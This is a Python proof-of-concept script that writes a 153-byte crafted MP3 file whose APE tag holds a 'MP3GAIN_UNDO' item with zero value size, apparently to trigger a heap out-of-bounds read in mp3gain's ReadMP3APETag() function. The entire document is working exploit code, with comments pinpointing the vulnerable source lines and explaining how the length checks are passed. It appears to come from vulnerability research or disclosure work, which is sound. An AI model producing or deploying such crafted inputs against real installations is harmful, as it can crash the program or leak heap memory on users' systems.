#!/usr/bin/env python3
"""
PoC generator for VULN 001: Heap OOB Read in MP3GAIN_UNDO APE Field Parsing
Function: ReadMP3APETag() in apetag.c, lines 229-242

Trigger: APE item name="MP3GAIN_UNDO", item_value_size=0
- value buffer is malloc(0+1) = 1 byte
- line 230: memcpy(tmpString, vp, 4)  -> reads 4 bytes from 1-byte buffer (OOB)
- line 234: memcpy(tmpString, vp, 4)  -> vp=value+5, way OOB
- line 238: *vp                       -> vp=value+10, way OOB
"""

import struct
import os

def build_poc():
    out_dir = os.path.dirname(os.path.abspath(__file__))
    out_path = os.path.join(out_dir, "vuln_001.mp3")

    # --- APE item: MP3GAIN_UNDO with vsize=0 ---
    # item_value_size (4B LE) + item_flags (4B LE) + key (null-terminated) + value (0 bytes)
    item_key   = b"MP3GAIN_UNDO\x00"   # 12 chars + null = 13 bytes
    item_vsize = 0
    item_flags = 0                      # UTF-8 text type
    item_value = b""                    # empty value (triggers OOB)

    item = struct.pack("<II", item_vsize, item_flags) + item_key + item_value
    # item total: 4 + 4 + 13 + 0 = 21 bytes

    items_data = item
    items_size = len(items_data)        # 21

    # Sanity check: remaining after reading vsize+flags = 21-8 = 13
    # isize = 12, check: 12+1+0 = 13 <= 13 -> passes (not strictly greater)
    # so parsing continues into the MP3GAIN_UNDO branch

    # --- APE footer (32 bytes) ---
    # Length field = items_size + footer_size(32) — does NOT include header
    tag_len = items_size + 32           # 53

    footer  = b"APETAGEX"
    footer += struct.pack("<I", 2000)   # Version = 2000 (APEv2)
    footer += struct.pack("<I", tag_len)# Length = 53
    footer += struct.pack("<I", 1)      # TagCount = 1
    footer += struct.pack("<I", 0)      # Flags = 0 (footer; no header; bit31=0)
    footer += b"\x00" * 8              # Reserved
    # footer total: 32 bytes

    # --- Fake MP3 prefix (enough to let mp3gain open the file) ---
    # MPEG1 Layer3 128kbps 44100Hz stereo sync word + padding
    fake_mp3 = b"\xff\xfb\x90\x00" + b"\x00" * 96   # 100 bytes

    poc = fake_mp3 + items_data + footer
    # File layout:
    #   [0..99]   fake MP3 data         (100 bytes)
    #   [100..120] APE item              (21 bytes)
    #   [121..152] APE footer            (32 bytes)
    # Total: 153 bytes
    # tag_offset = 153 (end of file)
    # footer at: 153 - 32 = 121  ✓
    # items at:  153 - 53 = 100  ✓  (fseek to tag_offset - TagLen)

    with open(out_path, "wb") as f:
        f.write(poc)

    print(f"[+] PoC written: {out_path} ({len(poc)} bytes)")
    print(f"    items_size={items_size}  tag_len={tag_len}  remaining_at_check=13")
    print(f"    Expected: heap OOB read inside MP3GAIN_UNDO branch (apetag.c:230,234,238)")

if __name__ == "__main__":
    build_poc()
